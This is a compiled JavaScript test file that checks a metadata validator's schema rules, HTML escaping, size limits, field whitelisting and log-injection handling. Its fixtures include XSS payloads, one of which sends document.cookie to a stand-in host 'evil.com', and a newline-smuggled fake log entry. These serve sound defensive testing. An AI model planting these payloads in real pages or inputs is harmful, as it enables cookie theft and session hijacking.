// Sprint 1 Day 8: Metadata Validation Tests
// Threat T4 Mitigation: Metadata Injection Attacks (Medium/P1)
import { describe, expect, it } from 'vitest';
import * as MetadataValidator from '../../../packages/rescript-core/src/security/MetadataValidator.bs.js';
describe('Metadata Schema Validation', () => {
    it('validates metadata against taskMetadataSchema successfully', () => {
        const validMetadata = {
            taskId: 'task-123',
            manifestVersion: 'v1.0',
            attempt: 1,
            retryCount: 0,
            requestedBy: 'user@example.com',
            tags: ['urgent', 'production'],
            priority: 'high'
        };
        const report = MetadataValidator.validateMetadata(MetadataValidator.taskMetadataSchema, validMetadata);
        expect(report.valid).toBe(true);
        expect(report.errors.length).toBe(0);
    });
    it('rejects metadata with missing required fields', () => {
        const invalidMetadata = {
            // Missing required 'taskId' field
            manifestVersion: 'v1.0',
            attempt: 1
        };
        const report = MetadataValidator.validateMetadata(MetadataValidator.taskMetadataSchema, invalidMetadata);
        expect(report.valid).toBe(false);
        expect(report.errors.length).toBeGreaterThan(0);
        expect(report.errors[0]).toContain("Required field 'taskId' is missing");
    });
    it('rejects metadata with invalid field types', () => {
        const invalidMetadata = {
            taskId: 'task-123',
            attempt: 'not-a-number', // Should be number
            priority: 'high'
        };
        const report = MetadataValidator.validateMetadata(MetadataValidator.taskMetadataSchema, invalidMetadata);
        expect(report.valid).toBe(false);
        expect(report.errors.some(err => err.includes("invalid type"))).toBe(true);
    });
    it('rejects metadata with fields exceeding max length', () => {
        const invalidMetadata = {
            taskId: 'task-123',
            requestedBy: 'x'.repeat(200) // Exceeds 128 char limit
        };
        const report = MetadataValidator.validateMetadata(MetadataValidator.taskMetadataSchema, invalidMetadata);
        expect(report.valid).toBe(false);
        expect(report.errors.some(err => err.includes("exceeds maximum length"))).toBe(true);
    });
    it('rejects metadata with arrays exceeding max items', () => {
        const invalidMetadata = {
            taskId: 'task-123',
            tags: Array(15).fill('tag') // Exceeds 10 item limit
        };
        const report = MetadataValidator.validateMetadata(MetadataValidator.taskMetadataSchema, invalidMetadata);
        expect(report.valid).toBe(false);
        expect(report.errors.some(err => err.includes("exceeds maximum items"))).toBe(true);
    });
});
describe('HTML Escaping & Sanitization', () => {
    it('escapes HTML special characters to prevent XSS', () => {
        const maliciousInput = '<script>alert("XSS")</script>';
        const escaped = MetadataValidator.escapeHtml(maliciousInput);
        expect(escaped).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;');
        expect(escaped).not.toContain('<script>');
    });
    it('sanitizes string metadata values recursively', () => {
        const metadata = {
            taskId: '<img src=x onerror=alert(1)>',
            requestedBy: 'user@example.com',
            tags: ['<b>bold</b>', 'normal-tag']
        };
        const sanitized = MetadataValidator.sanitizeMetadata(metadata);
        const taskId = sanitized.taskId;
        expect(typeof taskId).toBe('string');
        // In the sanitized object, HTML should be escaped
        const sanitizedTaskId = JSON.stringify(sanitized.taskId);
        expect(sanitizedTaskId).toContain('&lt;');
    });
    it('preserves non-string values during sanitization', () => {
        const metadata = {
            taskId: 'task-123',
            attempt: 5,
            retryCount: 2,
            priority: 'high'
        };
        const sanitized = MetadataValidator.sanitizeMetadata(metadata);
        expect(sanitized.attempt).toBe(5);
        expect(sanitized.retryCount).toBe(2);
    });
});
describe('Size Limits', () => {
    it('accepts metadata within 10KB size limit', () => {
        const validMetadata = {
            taskId: 'task-123',
            requestedBy: 'user@example.com',
            tags: ['tag1', 'tag2', 'tag3']
        };
        const report = MetadataValidator.validateMetadata(MetadataValidator.taskMetadataSchema, validMetadata);
        expect(report.valid).toBe(true);
    });
    it('rejects metadata exceeding 10KB size limit', () => {
        const oversizedMetadata = {
            taskId: 'task-123',
            // Create a large string (>10KB)
            requestedBy: 'x'.repeat(11000)
        };
        const size = MetadataValidator.calculateMetadataSize(oversizedMetadata);
        expect(size).toBeGreaterThan(MetadataValidator.maxMetadataSizeBytes);
        const report = MetadataValidator.validateMetadata(MetadataValidator.taskMetadataSchema, oversizedMetadata);
        expect(report.valid).toBe(false);
        expect(report.errors.some(err => err.includes("exceeds maximum allowed"))).toBe(true);
    });
});
describe('Field Whitelisting', () => {
    it('removes unknown fields from metadata', () => {
        const metadataWithUnknownFields = {
            taskId: 'task-123',
            manifestVersion: 'v1.0',
            unknownField1: 'should-be-removed',
            maliciousField: '<script>alert(1)</script>',
            anotherUnknown: 'also-removed'
        };
        const whitelisted = MetadataValidator.whitelistFields(MetadataValidator.taskMetadataSchema, metadataWithUnknownFields);
        expect(whitelisted.taskId).toBe('task-123');
        expect(whitelisted.manifestVersion).toBe('v1.0');
        expect(whitelisted.unknownField1).toBeUndefined();
        expect(whitelisted.maliciousField).toBeUndefined();
        expect(whitelisted.anotherUnknown).toBeUndefined();
    });
    it('reports removed fields in validation warnings', () => {
        const metadataWithUnknownFields = {
            taskId: 'task-123',
            unknownField1: 'value1',
            unknownField2: 'value2'
        };
        const report = MetadataValidator.validateMetadata(MetadataValidator.taskMetadataSchema, metadataWithUnknownFields);
        expect(report.warnings.length).toBeGreaterThan(0);
        expect(report.warnings[0]).toContain('Removed');
        expect(report.warnings[0]).toContain('unknown fields');
    });
});
describe('Complete Validation Pipeline - Threat T4 Integration', () => {
    it('validates, sanitizes, and whitelists metadata in single operation', () => {
        const rawMetadata = {
            taskId: 'task-<script>alert(1)</script>',
            manifestVersion: 'v1.0',
            attempt: 1,
            requestedBy: 'user@example.com',
            tags: ['<b>urgent</b>', 'production'],
            priority: 'high',
            unknownField: 'should-be-removed'
        };
        const report = MetadataValidator.validateMetadata(MetadataValidator.taskMetadataSchema, rawMetadata);
        // Should be valid after sanitization and whitelisting
        expect(report.valid).toBe(true);
        // Sanitized metadata should have HTML escaped
        const sanitizedTaskId = JSON.stringify(report.sanitized.taskId);
        expect(sanitizedTaskId).toContain('&lt;');
        expect(sanitizedTaskId).not.toContain('<script>');
        // Unknown fields should be removed
        expect(report.sanitized.unknownField).toBeUndefined();
        expect(report.warnings.length).toBeGreaterThan(0);
    });
    it('prevents XSS in effect payload tampering scenario', () => {
        // Simulate attacker attempting to inject XSS via metadata
        const maliciousMetadata = {
            taskId: 'task-123',
            requestedBy: '"><script>fetch("evil.com?cookie="+document.cookie)</script>',
            tags: ['<img src=x onerror=alert(document.domain)>'],
            priority: 'high'
        };
        const report = MetadataValidator.validateMetadata(MetadataValidator.taskMetadataSchema, maliciousMetadata);
        expect(report.valid).toBe(true);
        // All XSS vectors should be neutralized
        const sanitizedRequestedBy = JSON.stringify(report.sanitized.requestedBy);
        expect(sanitizedRequestedBy).not.toContain('<script>');
        expect(sanitizedRequestedBy).toContain('&lt;');
    });
    it('prevents log injection attacks via newline smuggling', () => {
        const metadata = {
            taskId: 'task-123\nINFO: ADMIN ACCESS GRANTED', // Attempt to inject fake log entry
            priority: 'high'
        };
        const sanitized = MetadataValidator.sanitizeMetadata(metadata);
        // Sanitized string should be trimmed and escaped
        const sanitizedTaskId = MetadataValidator.sanitizeString(metadata.taskId);
        expect(sanitizedTaskId).not.toContain('\n');
    });
});
//# sourceMappingURL=metadata-validation.test.js.map